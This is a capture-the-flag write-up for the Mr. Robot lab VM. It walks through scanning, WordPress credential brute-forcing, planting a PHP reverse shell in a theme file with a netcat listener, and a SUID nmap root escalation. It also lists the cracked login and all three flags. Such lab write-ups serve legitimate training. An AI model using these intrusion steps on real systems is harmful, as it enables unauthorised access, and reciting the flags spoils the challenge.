markdown
# Mr. Robot CTF Walkthrough - VulnHub/TryHackMe

## Introduction
The Mr. Robot CTF, inspired by the *Mr. Robot* TV show, is a beginner-to-intermediate Linux-based virtual machine available on [VulnHub](https://www.vulnhub.com/entry/mr-robot-1,151/) and [TryHackMe](https://tryhackme.com/room/mrrobot). The goal is to find three hidden keys (flags) through web enumeration, brute-forcing, and privilege escalation. This write-up documents my approach to solving the challenge.

## Challenge Description
The VM hosts a web server on ports 80 (HTTP) and 443 (HTTPS) with a *Mr. Robot*-themed interface. The challenge provides files like `robots.txt` and `fsocity.dic` to aid in finding the three flags. Tasks involve enumerating a web server, brute-forcing a WordPress login, and escalating privileges to root.

## Solution/Steps

### Key 1: Web Enumeration
1. **Scan the Network**: Identified the target IP using Netdiscover:
   bash
   netdiscover
   
   Target IP: `10.0.2.7` (adjust based on your setup).
2. **Port Scanning**: Used Nmap to find open ports:
   bash
   nmap -T4 -A -p- 10.0.2.7
   
   Result: Ports 80 (HTTP) and 443 (HTTPS) open.
3. **Check robots.txt**: Visited `http://10.10.58.206/robots.txt` and found `key-1-of-3.txt` and `fsocity.dic`. Downloaded the first key:
   bash
   wget http://10.0.2.7/key-1-of-3.txt
   
   **Flag 1**: `073403c8a58a1f80d943455fb30724b9`

### Key 2: WordPress Login
1. **Directory Brute-Forcing**: Used GoBuster to find hidden directories:
   bash
   gobuster dir -u http://10.0.2.7 -w /usr/share/wordlists/dirb/common.txt
   
   Discovered `/wp-login.php`.
2. **Brute-Force WordPress**: Used wpscan with `fsocity.dic` to crack the login
   Credentials: `elliot:ER28-0652`.
3. **Gain Shell Access**: Logged into WordPress, edited `comments.php` to upload a PHP reverse shell. Set up a Netcat listener:
   bash
   nc -nlvp 1234
   
   Navigated to `/home/robot` and found the second key:
   bash
   cat key-2-of-3.txt
   
   **Flag 2**: `822c73956184f694993bede3eb39f959`

### Key 3: Privilege Escalation
1. **Check SUID Binaries**: Found exploitable Nmap binary:
   bash
   find / -perm -u=s 2>/dev/null
   
   Nmap version 2.02–5.21 supports interactive mode.
2. **Exploit Nmap**: Used Nmap to gain root shell:
   bash
   nmap --interactive
   nmap> !sh
   
3. **Retrieve Final Flag**: Navigated to `/root`:
   bash
   cd /root
   cat key-3-of-3.txt
   
   **Flag 3**: `04787ddef27c3dee1ee161b21670b4e4`

## Tools and Techniques
- **Nmap**: Port scanning and privilege escalation.
- **GoBuster**: Directory brute-forcing.
- **wpscan**: WordPress credential brute-forcing.
- **wget**: File downloads.
- **Netcat**: Reverse shell handling.
- **PHP Reverse Shell**: Gained user access.

## Challenges Faced
I initially used a generic wordlist for wpscan, missing `fsocity.dic` in `robots.txt`. The Nmap interactive mode was new to me; researching GTFObins clarified the exploit. Thorough enumeration was key to avoiding dead ends.

## Flags
plaintext
- Key 1: 073403c8a58a1f80d943455fb30724b9
- Key 2: 822c73956184f694993bede3eb39f959
- Key 3: 04787ddef27c3dee1ee161b21670b4e4


## Conclusion
This CTF taught me the importance of enumeration and exploiting SUID binaries. The *Mr. Robot* theme made it engaging, and I improved my skills with Nmap and wpscan.
## References
- [VulnHub: Mr. Robot CTF](https://www.vulnhub.com/entry/mr-robot-1,151/)
- [TryHackMe: Mr. Robot CTF](https://tryhackme.com/room/mrrobot)
- [GTFObins: Nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [SecLists Wordlists](https://github.com/danielmiessler/SecLists)
- [PHP Reverse Shell] (https://github.com/pentestmonkey/php-reverse-shell)
  
